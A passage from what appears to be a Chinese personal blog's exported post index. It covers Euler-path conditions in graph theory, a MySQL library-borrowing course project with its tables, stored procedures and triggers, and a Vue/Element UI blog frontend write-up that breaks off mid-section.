<h3 id="无向图"><a href="#无向图" class="headerlink" title="无向图"></a>无向图</h3><p>无向图中具有一条欧拉图，当且仅当该图是连通图且有零个或者两个奇数度的节点，所有点的度都是偶数的时候，该图有欧拉回路，有两个奇数度的节点时，有欧拉通路。</p>
<h3 id="有向图"><a href="#有向图" class="headerlink" title="有向图"></a>有向图</h3><p>有向图具有欧拉路当且仅当该图是连通的，若每个节点的入度等于出度，则存在欧拉回路，若图中除了两个节点之外，每个点的入度等于出度，而这两个点中一个点的入度比出度大<code>1</code>，另外一个点的出度比入读大<code>1</code>，则存在欧拉通路。</p>
<h2 id="求解欧拉路"><a href="#求解欧拉路" class="headerlink" title="求解欧拉路"></a>求解欧拉路</h2><p>当判断图中具有欧拉路后，可以根据深度优先搜索，对每一条边设置访问标记，当找到一条欧拉路后直接结束搜索，否则根据回溯思想不断进行搜索。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>图论</tag>
      </tags>
  </entry>
  <entry>
    <title>图书借阅管理系统</title>
    <url>/2020/07/03/%E5%9B%BE%E4%B9%A6%E5%80%9F%E9%98%85%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<blockquote>
<p>项目地址：<a href="https://gitee.com/YaleXin/caozuoxitongkechengsheji" target="_blank" rel="noopener">gitee</a></p>
</blockquote>
<p>一次数据库课程设计，系统界面用C语言，后台数据用<code>MySQL</code>（如果不知道如何用C语言连接<code>MySQL</code>,参照我的<a href="https://www.yalexin.top/index.php/archives/46/" target="_blank" rel="noopener">上一篇文章</a>）。<a id="more"></a></p>
<h2 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h2><ul>
<li>E-R图</li>
</ul>
<p><img src="https://q.yalexin.top/%E6%80%BB%E4%BD%93er%E5%9B%BE.png" alt></p>
<ul>
<li><p>五张表：</p>
<ol>
<li><p>用户表（<u>编号</u>，姓名，性别，年龄）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;users&#96; (</span><br><span class="line">  &#96;PNO&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;PNAME&#96; varchar(20) NOT NULL,</span><br><span class="line">  &#96;GENDER&#96; enum(&#39;男&#39;,&#39;女&#39;) NOT NULL,</span><br><span class="line">  &#96;AGE&#96; int(20) DEFAULT &#39;18&#39;,</span><br><span class="line">  PRIMARY KEY (&#96;PNO&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8</span><br></pre></td></tr></table></figure>
</li>
<li><p>书籍表（<u>编号</u>，书名，库存）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;books&#96; (</span><br><span class="line">   &#96;BNO&#96; int(11) NOT NULL,</span><br><span class="line">   &#96;BNAME&#96; varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,</span><br><span class="line">   &#96;BINVENTORY&#96; int(11) NOT NULL DEFAULT &#39;0&#39;,</span><br><span class="line">   PRIMARY KEY (&#96;BNO&#96;)</span><br><span class="line"> ) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8</span><br></pre></td></tr></table></figure>
</li>
<li><p>书商表（<u>编号</u>，书商名，地址）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;booksellers&#96; (</span><br><span class="line">  &#96;SNO&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;SNAME&#96; varchar(20) DEFAULT NULL,</span><br><span class="line">  &#96;ADDR&#96; varchar(50) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;SNO&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8</span><br></pre></td></tr></table></figure>
</li>
<li><p>借阅表（<u>书籍编号</u>，<u>用户编号</u>，借阅日期，归还日期，是否已归还）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;borrowings&#96; (</span><br><span class="line">  &#96;BNO&#96; int(11) DEFAULT NULL,</span><br><span class="line">  &#96;PNO&#96; int(11) DEFAULT NULL,</span><br><span class="line">  &#96;BDATE&#96; timestamp NOT NULL DEFAULT &#39;0000-00-00 00:00:00&#39;,</span><br><span class="line">  &#96;RDATE&#96; timestamp NULL DEFAULT &#39;0000-00-00 00:00:00&#39;,</span><br><span class="line">  &#96;ISRETURN&#96; tinyint(1) DEFAULT &#39;0&#39;,</span><br><span class="line">  KEY &#96;borrowings_ibfk_1&#96; (&#96;PNO&#96;),</span><br><span class="line">  KEY &#96;borrowings_ibfk_2&#96; (&#96;BNO&#96;),</span><br><span class="line">  CONSTRAINT &#96;borrowings_ibfk_1&#96; FOREIGN KEY (&#96;PNO&#96;) REFERENCES &#96;users&#96; (&#96;PNO&#96;) ON DELETE SET NULL ON UPDATE CASCADE,</span><br><span class="line">  CONSTRAINT &#96;borrowings_ibfk_2&#96; FOREIGN KEY (&#96;BNO&#96;) REFERENCES &#96;books&#96; (&#96;BNO&#96;) ON DELETE SET NULL ON UPDATE CASCADE</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8mb4</span><br></pre></td></tr></table></figure>
</li>
<li><p>入库表（<u>书商编号</u>，<u>书籍编号</u>，入库数量）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;warehousings&#96; (</span><br><span class="line">   &#96;SNO&#96; int(11) DEFAULT NULL,</span><br><span class="line">   &#96;BNO&#96; int(11) DEFAULT NULL,</span><br><span class="line">   &#96;NUM&#96; int(11) DEFAULT NULL,</span><br><span class="line">   KEY &#96;SNO&#96; (&#96;SNO&#96;),</span><br><span class="line">   KEY &#96;BNO&#96; (&#96;BNO&#96;),</span><br><span class="line">   CONSTRAINT &#96;warehousings_ibfk_1&#96; FOREIGN KEY (&#96;SNO&#96;) REFERENCES &#96;booksellers&#96; (&#96;SNO&#96;) ON UPDATE CASCADE,</span><br><span class="line">   CONSTRAINT &#96;warehousings_ibfk_2&#96; FOREIGN KEY (&#96;BNO&#96;) REFERENCES &#96;books&#96; (&#96;BNO&#96;) ON DELETE SET NULL ON UPDATE CASCADE</span><br><span class="line"> ) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>存储过程</p>
<ol>
<li><p>借阅：根据用户ID和书籍ID，形成借阅关系</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP PROCEDURE IF EXISTS &#96;TRY_BORROW&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE DEFINER&#x3D;&#96;root&#96;@&#96;localhost&#96; PROCEDURE &#96;TRY_BORROW&#96;(IN PNO INT, IN BNO INT)</span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE EXIT HANDLER FOR SQLEXCEPTION </span><br><span class="line">    BEGIN</span><br><span class="line">        ROLLBACK ;</span><br><span class="line">        SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;借阅失败，库存不足或者编号错误！&#39; ;</span><br><span class="line">    END ;</span><br><span class="line">    START TRANSACTION ;</span><br><span class="line">    UPDATE </span><br><span class="line">        books </span><br><span class="line">    SET</span><br><span class="line">        BINVENTORY &#x3D; (BINVENTORY - 1) </span><br><span class="line">    WHERE books.&#96;BNO&#96; &#x3D; BNO ;</span><br><span class="line">    INSERT INTO borrowings (BNO, PNO, BDATE, ISRETURN) </span><br><span class="line">    VALUES</span><br><span class="line">        (BNO, PNO, NOW(), 0) ;</span><br><span class="line">    COMMIT ;</span><br><span class="line">END$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>归还：根据用户ID和书籍ID，修改记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP PROCEDURE IF EXISTS &#96;TRY_RETURN&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE DEFINER&#x3D;&#96;root&#96;@&#96;localhost&#96; PROCEDURE &#96;TRY_RETURN&#96;(IN mPNO INT, IN mBNO INT)</span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE EXIT HANDLER FOR SQLEXCEPTION </span><br><span class="line">    BEGIN</span><br><span class="line">        ROLLBACK ;</span><br><span class="line">        SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;归还失败&#39; ;</span><br><span class="line">    END ;</span><br><span class="line">    START TRANSACTION ;</span><br><span class="line">    UPDATE </span><br><span class="line">        books,</span><br><span class="line">        borrowings </span><br><span class="line">    SET</span><br><span class="line">        books.&#96;BINVENTORY&#96; &#x3D; (books.&#96;BINVENTORY&#96; + 1) </span><br><span class="line">    WHERE books.&#96;BNO&#96; &#x3D; mBNO </span><br><span class="line">        AND borrowings.&#96;BNO&#96; &#x3D; mBNO </span><br><span class="line">        AND borrowings.&#96;PNO&#96; &#x3D; mPNO </span><br><span class="line">        AND borrowings.&#96;ISRETURN&#96; &#x3D; 0 ;</span><br><span class="line">    UPDATE </span><br><span class="line">        borrowings </span><br><span class="line">    SET</span><br><span class="line">        borrowings.&#96;ISRETURN&#96; &#x3D; 1,</span><br><span class="line">        borrowings.&#96;RDATE&#96; &#x3D; NOW() </span><br><span class="line">    WHERE borrowings.&#96;BNO&#96; &#x3D; mBNO </span><br><span class="line">        AND borrowings.&#96;PNO&#96; &#x3D; mPNO </span><br><span class="line">        AND borrowings.&#96;ISRETURN&#96; &#x3D; 0 </span><br><span class="line">    LIMIT 1 ;</span><br><span class="line">    COMMIT ;</span><br><span class="line">END$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>入库：根据书商编号和书籍编号，将对应的书籍库存量进行修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP PROCEDURE IF EXISTS &#96;PUT_IN&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE DEFINER&#x3D;&#96;root&#96;@&#96;localhost&#96; PROCEDURE &#96;PUT_IN&#96;(IN mbno INT, IN msno INT, IN mnum INT)</span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE EXIT HANDLER FOR SQLEXCEPTION </span><br><span class="line">    BEGIN</span><br><span class="line">        ROLLBACK ;</span><br><span class="line">        SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;入库失败,编号错误或者入库数量错误&#39; ;</span><br><span class="line">    END ;</span><br><span class="line">    START TRANSACTION ;</span><br><span class="line">    INSERT INTO warehousings (BNO, SNO, NUM) </span><br><span class="line">    VALUES</span><br><span class="line">        (mbno, msno, mnum) ;</span><br><span class="line">    UPDATE </span><br><span class="line">        books </span><br><span class="line">    SET</span><br><span class="line">        BINVENTORY &#x3D; (BINVENTORY + mnum) </span><br><span class="line">    WHERE BNO &#x3D; mbno ;</span><br><span class="line">    COMMIT ;</span><br><span class="line">END$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>触发器</p>
<p>​      由于<code>MySQL5.6</code>不支持<code>check</code>功能，因此需要通过触发器限制某些属性的值的范围。</p>
<ol>
<li><p>书籍数量必须是非负数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;BOOK_INVENTORY_INSERT&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;BOOK_INVENTORY_INSERT&#96; BEFORE INSERT ON &#96;books&#96; </span><br><span class="line">    FOR EACH ROW BEGIN</span><br><span class="line">IF NEW.BINVENTORY &lt; 0 </span><br><span class="line">THEN</span><br><span class="line">SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;您输入的库存量不符合现实意义：&#39;;</span><br><span class="line">END IF;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;BOOK_INVENTORY_UPDATE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;BOOK_INVENTORY_UPDATE&#96; BEFORE UPDATE ON &#96;books&#96; </span><br><span class="line">    FOR EACH ROW </span><br><span class="line">BEGIN</span><br><span class="line">    IF NEW.BINVENTORY &lt; 0 </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;新的的库存量不符合现实意义：&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>书籍数量必须是非负数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;USER_AGE_INSERT&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;USER_AGE_INSERT&#96; BEFORE INSERT ON &#96;users&#96; </span><br><span class="line">    FOR EACH ROW </span><br><span class="line">BEGIN</span><br><span class="line">    IF NEW.AGE &lt; 0 OR NEW.AGE &gt; 200 </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;户年龄不符合现实意义：&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;USER_AGE_UPDATE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;USER_AGE_UPDATE&#96; BEFORE UPDATE ON &#96;users&#96; </span><br><span class="line">    FOR EACH ROW BEGIN</span><br><span class="line">    IF NEW.AGE &lt; 0 </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;新的用户年龄不符合现实意义：&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">    END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>用户删除之前需要归还所有书籍</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;PEOPLE_DELETE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;PEOPLE_DELETE&#96; BEFORE DELETE ON &#96;users&#96; </span><br><span class="line">    FOR EACH ROW </span><br><span class="line">BEGIN</span><br><span class="line">    IF EXISTS </span><br><span class="line">    (SELECT </span><br><span class="line">        * </span><br><span class="line">    FROM</span><br><span class="line">        borrowings </span><br><span class="line">    WHERE old.PNO &#x3D; borrowings.&#96;PNO&#96; </span><br><span class="line">        AND borrowings.&#96;ISRETURN&#96; &#x3D; 0) </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;该用户仍有未归还的书籍，无法删除&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>书籍删除之前确保该书籍已归还完毕</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;BOOK_DELETE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;BOOK_DELETE&#96; BEFORE DELETE ON &#96;books&#96; </span><br><span class="line">    FOR EACH ROW BEGIN</span><br><span class="line">IF EXISTS (</span><br><span class="line">SELECT * FROM</span><br><span class="line">borrowings</span><br><span class="line">WHERE old.BNO &#x3D; borrowings.&#96;BNO&#96; AND borrowings.&#96;ISRETURN&#96; &#x3D; 0</span><br><span class="line">)</span><br><span class="line">THEN</span><br><span class="line">SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;该书籍仍有未归还的记录，无法删除&#39;;</span><br><span class="line">END IF;</span><br><span class="line">    END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>书记入库数量不能是负数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;PUT_IN_STORAGE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;PUT_IN_STORAGE&#96; BEFORE INSERT ON &#96;warehousings&#96; </span><br><span class="line">    FOR EACH ROW BEGIN</span><br><span class="line">    IF new.NUM &lt; 0 THEN</span><br><span class="line">    SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;入库量不能是负数&#39;;</span><br><span class="line">    END IF;</span><br><span class="line">    END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>不能随便修改入库记录中的入库数量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;WAREHOUSINGS_UPDATE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;WAREHOUSINGS_UPDATE&#96; BEFORE UPDATE ON &#96;warehousings&#96; </span><br><span class="line">    FOR EACH ROW </span><br><span class="line">BEGIN</span><br><span class="line">    IF new.NUM !&#x3D; old.NUM </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;入库量不能随意修改&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>用户权限设置</p>
<table>
<thead>
<tr>
<th><strong>用户</strong></th>
<th><strong>权限</strong></th>
</tr>
</thead>
<tbody><tr>
<td>root</td>
<td>对整个数据库bookbrdb拥有所有权</td>
</tr>
<tr>
<td>bookAdmin</td>
<td>对书籍表拥有所有权、借阅表有插入、选择、更新权</td>
</tr>
<tr>
<td>userAdmin</td>
<td>对用户表拥有所有权</td>
</tr>
<tr>
<td>booksellerAdmin</td>
<td>对书商表拥有所有权、入库表拥有插入权、选择权、书籍表有更新权</td>
</tr>
</tbody></table>
</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>数据库</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>基于Vue和Element UI搭建的博客前端界面</title>
    <url>/2021/02/07/%E5%9F%BA%E4%BA%8EVue%E5%92%8CElement-UI%E6%90%AD%E5%BB%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%89%8D%E7%AB%AF%E7%95%8C%E9%9D%A2/</url>
    <content><![CDATA[<p><a href="https://github.com/YaleXin/rblog/tree/relese-1.0" target="_blank" rel="noopener">项目地址</a></p>
<p><a href="https://yalexin.gitee.io/rblog-demo/index.html#">演示地址</a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前我的<a href="https://www.yalexin.top/" target="_blank" rel="noopener">个人博客系统</a>是使用<code>SpringBoot</code>和<code>thymeleaf</code>模板引擎开发的，个人觉得还可以，最近突发奇想，何不借点时间，把博客重构一下，使用<code>Vue</code>作为前端，<code>SpringBoot</code>最为后端，前后端分离，继续夯实自己的实力。</p>
<a id="more"></a>

<h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><p>大概的思路是沿用大部分旧博客的后端逻辑，之前持久层是使用<code>JPA</code>，后面视具体情况而定，有可能换用<code>MyBatis</code>。</p>
<p>前端使用<code>Vue</code>作为模板引擎， 是当下很火的一个<code>JavaScript MVVM</code>库，它是以数据驱动和组件化的思想构建的，在国内十分流行，在这里也不得不崇拜一下尤大。</p>
<p><code>UI</code>部分，鉴于个人能力太菜，:D，使用原生三件套做出来的界面实在是太丑，只好借助第三方<code>UI</code>框架，这里采用<code>Element UI</code>，原本想使用<code>Bootstrap</code>，但是在<code>Vue</code>框架的前提下，使用<code>Element UI</code>上手会容易得多，毕竟，<code>ElementUI</code>就是基于<code>Vue 2.0</code>开发的，文档也是比较齐全，但是使用该框架的过程，我也踩了一些坑，这些坑在官方文档中都是没有说明白的：</p>
<ul>
<li><p><code>Backtop</code>组件需要是父节点的第一个子节点。</p>
</li>
<li><p><code>Select</code>选择器必须给其一个宽度，不然文字不显示</p>
</li>
<li><p>表格组件中如果想要实现单元格居中，需要给<code>el-table-column</code>组件一个属性<code>align=&quot;center&quot;</code></p>
</li>
</ul>
<h2 id="涉及到的项目"><a href="#涉及到的项目" class="headerlink" title="涉及到的项目"></a>涉及到的项目</h2><ul>
<li><a href="https://cn.vuejs.org/" target="_blank" rel="noopener"><code>Vue</code></a></li>
<li><a href="https://element.eleme.cn/" target="_blank" rel="noopener">Element UI</a></li>
<li><a href="http://axios-js.com/" target="_blank" rel="noopener">axios</a></li>
<li><a href="https://prismjs.com/" target="_blank" rel="noopener"><code>prism</code></a>(代码高亮)</li>
<li><a href="https://typo.sofi.sh/" target="_blank" rel="noopener"><code>typo.css</code></a>(文章样式)</li>
<li><a href="https://github.com/animate-css/animate.css" target="_blank" rel="noopener">animate.css</a> </li>
<li><a href="http://fancyapps.com/fancybox/" target="_blank" rel="noopener"><code>fancybox</code></a> </li>
<li><a href="https://github.com/zhaoxuhui1122/vue-markdown" target="_blank" rel="noopener">vue-markdown</a> </li>
<li><a href="https://www.jinrishici.com/" target="_blank" rel="noopener">今日诗词</a></li>
<li><a href="http://www.fontawesome.com.cn/" target="_blank" rel="noopener">Font Awesome</a></li>
<li>…</li>
</ul>
<h2 id="前端实现"><a href="#前端实现" class="headerlink" title="前端实现"></a>前端实现</h2><h3 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h3><h4 id="首页"><a href="#首页" class="headerlink" title="==首页=="></a>==首页==</h4><p><img src="https://qiniu.yalexin.top/home.png" alt></p>
<p><img src="https://qiniu.yalexin.top/m-home.png" alt></p>
<h4 id="分类"><a href="#分类" class="headerlink" title="==分类=="></a>==分类==</h4><p><img src="https://qiniu.yalexin.top/ctgr.png" alt><br><img src="https://qiniu.yalexin.top/m-ctgr.png" alt></p>
<h4 id="标签"><a href="#标签" class="headerlink" title="==标签=="></a>==标签==</h4><p><img src="https://qiniu.yalexin.top/tag.png" alt><br><img src="https://qiniu.yalexin.top/m-tag.png" alt></p>
<h4 id="友链"><a href="#友链" class="headerlink" title="==友链=="></a>==友链==</h4><p><img src="https://qiniu.yalexin.top/link.png" alt><br><img src="https://qiniu.yalexin.top/m-link.png" alt></p>
<h4 id="留言"><a href="#留言" class="headerlink" title="==留言=="></a>==留言==</h4><p><img src="https://qiniu.yalexin.top/talk.png" alt><br><img src="https://qiniu.yalexin.top/m-talk.png" alt></p>
<h4 id="归档"><a href="#归档" class="headerlink" title="==归档=="></a>==归档==</h4><p><img src="https://qiniu.yalexin.top/archive.png" alt></p>
<p><img src="https://qiniu.yalexin.top/m-archive.png" alt></p>
<h4 id="文章详情"><a href="#文章详情" class="headerlink" title="==文章详情=="></a>==文章详情==</h4><p><img src="https://qiniu.yalexin.top/blog-1.png" alt></p>
<h4 id="赞赏"><a href="#赞赏" class="headerlink" title="==赞赏=="></a>==赞赏==</h4><p><img src="https://qiniu.yalexin.top/ap1.png" alt></p>
<h4 id="底部"><a href="#底部" class="headerlink" title="==底部=="></a>==底部==</h4><p><img src="https://qiniu.yalexin.top/m-footer.png" alt></p>
<h3 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h3><h4 id="登录界面"><a href="#登录界面" class="headerlink" title="==登录界面=="></a>==登录界面==</h4><p><img src="https://qiniu.yalexin.top/admin-login.png" alt></p>
<h4 id="博客列表"><a href="#博客列表" class="headerlink" title="==博客列表=="></a>==博客列表==</h4><p><img src="https://qiniu.yalexin.top/admin-blogList.png" alt></p>
<h4 id="编辑博客"><a href="#编辑博客" class="headerlink" title="==编辑博客=="></a>==编辑博客==</h4><p><img src="https://qiniu.yalexin.top/admin-blog-edit.png" alt></p>
<h4 id="分类管理"><a href="#分类管理" class="headerlink" title="==分类管理=="></a>==分类管理==</h4><p> <img src="https://qiniu.yalexin.top/admin-ctgr.png" alt> </p>
<h4 id="标签管理"><a href="#标签管理" class="headerlink" title="==标签管理=="></a>==标签管理==</h4><p> <img src="https://qiniu.yalexin.top/admin-tag.png" alt> </p>
<h4 id="评论管理"><a href="#评论管理" class="headerlink" title="==评论管理=="></a>==评论管理==</h4><p> <img src="https://qiniu.yalexin.top/admin-cmt.png" alt> </p>
<h4 id="用户信息"><a href="#用户信息" class="headerlink" title="==用户信息=="></a>==用户信息==</h4><p> <img src="https://qiniu.yalexin.top/admin-user.png" alt> </p>
<h2 id="前后端分离遇到的坑"><a href="#前后端分离遇到的坑" class="headerlink" title="前后端分离遇到的坑"></a>前后端分离遇到的坑</h2><h3 id="前端Date数据类型与数据库不一致"><a href="#前端Date数据类型与数据库不一致" class="headerlink" title="前端Date数据类型与数据库不一致"></a>前端Date数据类型与数据库不一致</h3><p>具体而言，是前端接收到的时间比数据库中慢8个小时，是因为我在数据库URL中设置了时区是亚洲上海，即东八区，而前后端传送数据时候默认使用UTC时间，因此前端接收的时候会自动减去8小时，这时候要么指定连接数据库时时区为UTC，要么指定数据传输使用的时区，例如在Spring Boot框架中可以这样设置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">jackson:</span></span><br><span class="line">    <span class="attr">time-zone:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/blog?serverTimezone=Asia/Shanghai</span></span><br></pre></td></tr></table></figure>

<h3 id="axios使用delete方法，后端无法接收"><a href="#axios使用delete方法，后端无法接收" class="headerlink" title="axios使用delete方法，后端无法接收"></a>axios使用delete方法，后端无法接收</h3><p>一般使用put或者post方式时候，传送数据是这样子的：</p>
